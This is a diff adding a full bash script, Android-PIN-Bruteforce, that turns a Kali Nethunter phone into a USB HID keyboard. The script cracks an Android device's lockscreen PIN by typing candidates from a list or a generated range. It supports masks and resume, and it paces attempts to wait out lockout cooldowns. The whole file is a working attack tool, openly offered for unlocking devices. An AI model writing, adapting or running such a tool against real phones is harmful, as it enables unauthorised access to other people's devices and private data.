@@ -1,0 +1,520 @@
+#!/bin/bash
+# Android-PIN-Bruteforce
+# 
+# Unlock an Android phone (or device) by bruteforcing the lockscreen PIN.
+# 
+# Turn your Kali Nethunter phone into a bruteforce PIN cracker for Android devices!
+# This uses the USB OTG cable to emulate a keyboard, automatically try PINs, and wait after trying too many wrong guesses.
+#
+# https://github.com/urbanadventurer/Android-PIN-Bruteforce
+
+
+# Load Default Configuration
+source config.default
+# Load Configuration
+source config
+
+
+VERSION=0.1
+
+# Operating System Environment
+KEYBOARD_DEVICE=/dev/hidg0
+HID_KEYBOARD=/system/xbin/hid-keyboard
+USB_DEVICES=/usr/bin/usb-devices
+
+DIRECTION=1 # go forwards
+#RET=0
+
+LIGHT_GREEN="\033[92m"
+LIGHT_YELLOW="\033[93m"
+LIGHT_RED="\033[91m"
+LIGHT_BLUE="\033[94m"
+DEFAULT="\033[39m"
+CLEAR_LINE="\033[1K"
+MOVE_CURSOR_LEFT="\033[80D"
+
+function usage() {
+  echo -e "
+Android-PIN-Bruteforce is used to unlock an Android phone (or device) by bruteforcing the lockscreen PIN.
+
+  Find more information at: https://github.com/urbanadventurer/Android-PIN-Bruteforce
+
+Commands:
+  crack\t\t\tBegin cracking PINs
+  resume\t\tResume from a chosen PIN
+  rewind\t\tCrack PINs in reverse from a chosen PIN
+  diag\t\t\tDisplay diagnostic information
+
+Options:
+  -f, --from PIN\tResume from this PIN
+  -m, --mask REGEX\tUse a mask for known digits in the PIN
+  -t, --type TYPE\tSelect PIN or PATTERN cracking
+  -l, --length NUM\tCrack PINs of NUM length
+  -d, --dry-run\t\tDry run for testing. Doesn't send any keys.
+  -v, --verbose\t\tOutput verbose logs.
+
+Usage:
+  android-pin-bruteforce <command> [options]
+
+"
+
+}
+
+
+function load_pinlist() {
+  length=$1
+
+  top_number=$((10**$length-1))
+
+  # Only load from file if it's 4 digits
+  if [ $length -eq 4 ]; then
+    pinlist=(`cat $PIN_LIST`)
+  else
+    # generate the list
+    pinlist=(`seq -w 0 $top_number`)
+  fi
+
+  if [ -n "$MASK" ]; then
+    pinlist=(`echo "${pinlist[@]}" | tr ' ' '\n' | egrep "$MASK" | tr '\n' ' '`)
+  fi
+
+  # validate mask returned PINs
+  if [ ${#pinlist[@]} -eq 0 ]; then
+    log_fail "MASK $MASK created an invalid PIN list with zero PINs"
+    abort
+  fi
+
+  resume_from_index=0
+  if [ -n "$RESUME_FROM_PIN" ]; then
+ #   log_debug "Looking for $RESUME_FROM_PIN in pinlist"
+    for i in "${!pinlist[@]}"; do
+       if [[ "${pinlist[$i]}" = "${RESUME_FROM_PIN}" ]]; then
+  #         log_debug  "Found ${RESUME_FROM_PIN} at element ${i}"
+          resume_from_index=$i
+       fi
+    done
+  fi
+}
+
+
+function repeat(){
+  printf "%0.s$1" $(eval echo {1..$2})
+}
+
+
+# progress bar
+# https://unix.stackexchange.com/questions/415421/linux-how-to-create-simple-progress-bar-in-bash
+function prog() {
+    tput cup 0 0
+    local w=80 p=$1
+    shift
+    # create a string of spaces, then change them to dots
+    printf -v dots "%*s" "$(( $p*$w/100 ))" ""
+    dots=${dots// /x}
+    # print those dots on a fixed-width space plus the percentage etc. 
+    printf "\r\e[K|%-*s| %3d %% %s" "$w" "$dots" "$p" "$*"
+}
+
+
+function diagnostic_info() {
+  log_info "Diagnostic info"
+
+  if [ -e $KEYBOARD_DEVICE ]; then
+    log_pass "HID device ($KEYBOARD_DEVICE) found"
+    ls -l $KEYBOARD_DEVICE
+  else
+    log_fail "HID device ($KEYBOARD_DEVICE) not found"
+  fi
+
+  if [ -f $HID_KEYBOARD ]; then
+    log_pass "hid-keyboard executable ($HID_KEYBOARD) found" 
+    ls -l $HID_KEYBOARD
+  else
+    log_fail "hid-keyboard executable ($HID_KEYBOARD) not found"  
+  fi
+
+  if [ -f $USB_DEVICES ]; then
+    log_pass "usb-devices executable ($USB_DEVICES) found" 
+    ls -l $USB_DEVICES
+  else
+    log_fail "usb-devices executable ($USB_DEVICES) not found"  
+  fi
+
+  log_info "Executing Command: $USB_DEVICES"
+  $USB_DEVICES
+  RET=$?
+  if [ $RET -eq 0 ]; then
+    log_pass "usb-devices script executed succeessfully."
+  else
+    log_fail "usb-devices script failed. Return code $RET."
+  fi
+
+  log_info "Finding Android Phone USB Device"
+  devices=$($USB_DEVICES | egrep -C 5 "Manufacturer=[^L][^i][^n][^u][^x]" \
+ | egrep "Vendor|Manufacturer|Product|SerialNumber" | cut -c 5- )
+  
+  if [ -n "$devices" ]; then
+    log_pass "Device identified: $devices"
+  else
+    log_fail "Device not found"
+  fi
+
+  log_info "Sending Enter Key"
+  echo enter | $HID_KEYBOARD $KEYBOARD_DEVICE keyboard
+  RET=$?
+
+  if [ $RET -eq 0 ]; then
+    log_pass "Key was sent succeessfully."
+  else
+    log_fail "Key failed to send. Return code $RET."
+  fi
+
+  log_info "Executing Command: /system/bin/getprop |grep usb"
+  /system/bin/getprop |grep usb
+  RET=$?
+  echo  
+
+  log_info "Executing Command: dmesg | grep -i usb | tail"
+  dmesg | grep -i usb | tail
+  echo  
+
+  log_info "Troubleshooting tips"
+  echo "- Nethunter HID support can be a PITA."
+  echo "- Try powering off the phone and taking out the battery"
+  echo "- Try /system/bin/setprop sys.usb.config hid"
+  echo "- Try it on your PC or laptop"
+  echo
+  exit
+}
+
+function discover_device() {
+ if [ $DRY_RUN -eq 0 ]; then
+    # accepts any USB device manufacturer except Linux
+    devices=$(usb-devices | egrep -C 5 "Manufacturer=[^L][^i][^n][^u][^x]" \
+ | egrep "Vendor|Manufacturer|Product|SerialNumber" | cut -c 5- )
+ else
+    devices="Manufacturer: Dry-run Dummy Android Device"
+ fi
+
+ if [ -n "$devices" ]; then
+   log_pass "Device identified: $devices"
+ fi
+}
+
+# Show configuration
+function show_configuration() {
+  log_conf "PIN list: $PIN_LIST"
+  log_conf "Delay between keystrokes: $DELAY_BETWEEN_KEYS"
+  log_conf "HID Keyboard device: $KEYBOARD_DEVICE"
+  log_conf "Log file: $LOG"
+  log_conf "Mask: $MASK"
+  log_conf "Resume from: $RESUME_FROM_PIN"
+  log_conf "PIN Type (PIN or Pattern): $PIN_TYPE"
+  log_conf "PIN Length: $PIN_LENGTH"
+
+}
+
+function abort() {
+  if [ $DRY_RUN -eq 0 ]; then
+    exit 1
+  else
+    # continue
+    echo Dry Run Continues
+  fi
+}
+
+function send_enter() {
+  send_key enter
+}
+
+function send_esc() {
+  send_key esc
+}
+
+function send_key(){
+
+  if [ $DRY_RUN -eq 0 ]; then
+    echo $1 | $HID_KEYBOARD $KEYBOARD_DEVICE keyboard 2>/dev/null
+    RET=$?
+    sleep $DELAY_BETWEEN_KEYS
+  else
+    RET=0 # as if it succeeded
+    sleep $DELAY_BETWEEN_KEYS
+  fi
+}
+
+
+function log_info(){
+  echo -e "[${LIGHT_BLUE}INFO${DEFAULT}] $1" | tee -a $LOG
+}
+
+function log_pass(){
+  echo -e "[${LIGHT_GREEN}PASS${DEFAULT}] $1" | tee -a $LOG
+}
+
+function log_fail(){
+  echo -e "[${LIGHT_RED}FAIL${DEFAULT}] $1" | tee -a $LOG
+}
+
+function log_conf(){
+  echo -e "[${LIGHT_YELLOW}CONF${DEFAULT}] $1" | tee -a $LOG
+}
+
+
+function log_debug(){
+  if [ $VERBOSE -gt 0 ]; then
+    echo -e "[${LIGHT_YELLOW}DEBUG${DEFAULT}] $1" | tee -a $LOG
+  fi
+}
+
+
+function monitor_phone_connection(){
+  # check connection to phone
+  # RET is set by the send_key/send_enter function
+  fail_counter=0
+  while [ $RET != 0 ]; do
+    log_fail "HID USB device not ready. $HID_KEYBOARD returned $RET." 
+    sleep 2
+    send_enter
+    ((fail_counter++))
+
+    if [[ $fail_counter -gt $EXIT_AFTER_FAIL_COUNT ]]; then
+      log_fail "Exiting after $EXIT_AFTER_FAIL_COUNT successive failures."
+      abort
+    fi
+  done
+}
+
+
+function check_environment(){
+  if [ -e $KEYBOARD_DEVICE ]; then
+    log_pass "HID device ($KEYBOARD_DEVICE) found"
+  else
+    log_fail "HID device ($KEYBOARD_DEVICE) not found"
+    abort
+  fi
+
+  if [ -f $HID_KEYBOARD ]; then
+    log_pass "hid-keyboard executable ($HID_KEYBOARD) found" 
+  else
+    log_fail "hid-keyboard executable ($HID_KEYBOARD) not found"
+    abort  
+  fi
+
+  if [ -f $USB_DEVICES ]; then
+    log_pass "usb-devices executable ($USB_DEVICES) found" 
+  else
+    log_fail "usb-devices executable ($USB_DEVICES) not found"
+    abort  
+  fi
+}
+
+
+
+# Commandline option handling inspired by ./configure
+
+ac_prev=
+for ac_option
+do
+  # If the previous option needs an argument, assign it.
+  if test -n "$ac_prev"; then
+    eval "$ac_prev=\$ac_option"
+    ac_prev=
+    continue
+  fi
+
+  case "$ac_option" in
+  -*=*) ac_optarg=`echo "$ac_option" | sed 's/[-_a-zA-Z0-9]*=//'` ;;
+  *) ac_optarg= ;;
+  esac
+
+  case "$ac_option" in
+
+  -from | -f | --from)
+    ac_prev=from ;;
+
+  -from=* | -f=* | --from=*)
+    from="$ac_optarg" ;;
+
+  -length=* | -l=* | --length=*)
+    length="$ac_optarg" ;;
+
+  -length | -l | --length)
+    ac_prev=length ;;
+
+  -mask | -m | --mask)
+    ac_prev=mask ;;
+
+  -mask=* | -m=* | --mask=*)
+    mask="$ac_optarg" ;;
+
+  -type=* | -t=* | --type=*)
+    type="$ac_optarg" ;;
+
+  -type | -t | --type)
+    ac_prev=type ;;
+
+  -verbose | -v | --verbose)
+    VERBOSE=1 ;;
+
+  -help | -h | --help)
+    usage 
+    exit 1 ;;
+
+  -dryrun | -d | --dryrun | -dry-run | --dry-run )
+    DRY_RUN=1 ;;
+
+  diag*)
+    diagnostic_info
+    exit ;;
+
+  crack)
+    ACTION=crack ;;
+
+  resume)
+    ACTION=resume ;;
+
+  rewind)
+    ACTION=rewind 
+    DIRECTION=-1 ;;
+
+  -*) { echo "Error: $ac_option: invalid option; use --help to show usage" 1>&2; exit 1; }
+    ;;
+
+  *)
+    if test "x$nonopt" != xNONE; then
+      { echo "Error: invalid options" 1>&2; exit 1; }
+    fi
+    nonopt="$ac_option"
+    ;;
+
+  esac
+done
+
+if test -n "$ac_prev"; then
+  { echo "configure: error: missing argument to --`echo $ac_prev | sed 's/_/-/g'`" 1>&2; exit 1; }
+fi
+
+# only set VARS if specified in commandline arguments
+if [[ -n "$mask" ]]; then
+  MASK=$mask
+fi
+if [[ -n "$from" ]]; then
+  RESUME_FROM_PIN=$from
+fi
+if [[ -n "$type" ]]; then
+  PIN_TYPE=$type
+fi
+if [[ -n "$length" ]]; then
+  PIN_LENGTH=$length
+fi
+
+# Validation
+
+# Validate PIN TYPE 
+case "$PIN_TYPE" in
+  pattern | PATTERN )
+    log_fail "Pattern cracking is not yet implemented."
+    abort ;;
+  pin | PIN )
+    ;;
+  *)
+    log_fail "Type $PIN_TYPE cracking is not available."
+    abort ;;
+esac
+
+# Validate PIN LENGTH
+if [[ "$PIN_LENGTH" > 0 ]] && [[ "$PIN_LENGTH" < 9 ]]; then
+  # nothing
+  echo -n
+else
+  log_fail "PIN length is invalid. Valid lengths are 1 to 9."
+fi
+
+# rewind, resume require that RESUME_FROM_PIN be set
+if [[ "$ACTION" = "resume" ]] || [[ "$ACTION" = "rewind" ]] && [[ -z "$RESUME_FROM_PIN" ]]; then
+  log_fail "$ACTION requires that --from be set"
+  exit 1
+fi
+
+if [ -z "$1" ]; then
+  usage
+  exit 1
+fi
+
+
+echo "Android PIN brute-force :: version $VERSION" | tee -a $LOG
+
+if [[ $DRY_RUN -eq 1 ]]; then
+  log_info "Dry run enabled"
+fi
+
+if [[ $VERBOSE > 0 ]]; then
+  log_info "Current Configuration"
+  show_configuration
+fi
+
+# Check Environment
+log_info "Checking environment"
+check_environment
+
+# Find Android phone over USB cable
+log_info "Identifying Android Phone"
+discover_device
+
+send_enter
+sleep 1
+send_enter
+sleep 1
+
+
+
+load_pinlist $PIN_LENGTH
+position=$resume_from_index
+pinlist_n_elements=${#pinlist[@]}
+
+for (( position=$resume_from_index ; position>=0 && position <= pinlist_n_elements; position=position+DIRECTION ))
+do
+  ((count++))
+  pin=${pinlist[position]}
+
+  # hit escape and enter before every PIN attempted
+  send_esc
+  send_enter
+
+  # if we got an error from sending the key, check the phone connection
+  if [ $RET -gt 0 ]; then
+    monitor_phone_connection
+  fi
+
+  percent_complete=$((100*$position/$pinlist_n_elements))
+  echo "[SEND] $pin. Attempt $count ($percent_complete%) at $(date +"%b%d %r")" | tee -a "$LOG" 
+#  prog $percent_complete
+
+  for i in `echo "$pin" | grep -o .`; do
+    send_key $i
+  done
+  send_enter
+
+  # COOLDOWN_TIME is optional
+  if [[ $COOLDOWN_TIME > 0 && $COOLDOWN_AFTER_N_ATTEMPTS > 0 ]]; then
+    # if we are after N attempts
+    if [ $((count % $COOLDOWN_AFTER_N_ATTEMPTS)) = 0 ]; then
+      # countdown COOLDOWN_TIME seconds
+      for (( countdown=$COOLDOWN_TIME; countdown > 0; countdown-- ))
+      do
+        echo -ne "$CLEAR_LINE$MOVE_CURSOR_LEFT" # clear line and move cursor left
+        echo -ne "[${LIGHT_YELLOW}WAIT${DEFAULT}] "
+        echo -ne "$countdown"
+        if [ $(($countdown%5)) = 0 ]; then
+          send_enter
+        fi
+        sleep 1
+      done
+      echo -ne "$CLEAR_LINE$MOVE_CURSOR_LEFT" 
+    fi
+  fi
+done
+
+log_info "End of PIN list reached"
+
